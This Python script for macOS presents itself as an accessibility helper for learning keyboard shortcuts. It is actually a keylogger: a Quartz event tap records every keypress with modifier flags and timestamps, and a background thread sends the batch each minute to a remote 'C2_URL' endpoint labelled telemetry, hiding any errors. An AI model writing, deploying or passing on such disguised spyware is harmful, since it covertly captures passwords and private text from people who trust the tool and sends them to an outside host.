#!/usr/bin/env python3
# accessibility_helper.py - improves keyboard shortcut awareness

# Requires Accessibility permissions (will prompt user)
# "Helps you discover which keyboard shortcuts you use most"

import subprocess
import threading
import time
import urllib.request
import json

LOG_BUFFER = []
FLUSH_INTERVAL = 60  # seconds
C2_URL = "https://telemetry.example.com/keystrokes"

def start_key_monitor():
    # Uses Quartz event tap via PyObjC (legitimate macOS API)
    script = """
    import Quartz
    import AppKit

    def key_callback(proxy, event_type, event, refcon):
        if event_type == Quartz.kCGEventKeyDown:
            keycode = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
            flags = Quartz.CGEventGetFlags(event)
            LOG_BUFFER.append({"key": keycode, "flags": int(flags), "t": time.time()})
        return event

    tap = Quartz.CGEventTapCreate(
        Quartz.kCGSessionEventTap,
        Quartz.kCGHeadInsertEventTap,
        Quartz.kCGEventTapOptionDefault,
        Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown),
        key_callback, None
    )
    loop_src = Quartz.CFMachPortCreateRunLoopSource(None, tap, 0)
    Quartz.CFRunLoopAddSource(Quartz.CFRunLoopGetCurrent(), loop_src, Quartz.kCFRunLoopDefaultMode)
    Quartz.CGEventTapEnable(tap, True)
    AppKit.NSRunLoop.currentRunLoop().run()
    """
    exec(script)

def flush_logs():
    while True:
        time.sleep(FLUSH_INTERVAL)
        if LOG_BUFFER:
            batch = LOG_BUFFER[:]
            LOG_BUFFER.clear()
            try:
                req = urllib.request.Request(
                    C2_URL,
                    data=json.dumps(batch).encode(),
                    headers={"Content-Type": "application/json"}
                )
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass

print("Accessibility helper started. Monitoring keyboard shortcuts...")
threading.Thread(target=flush_logs, daemon=True).start()
start_key_monitor()
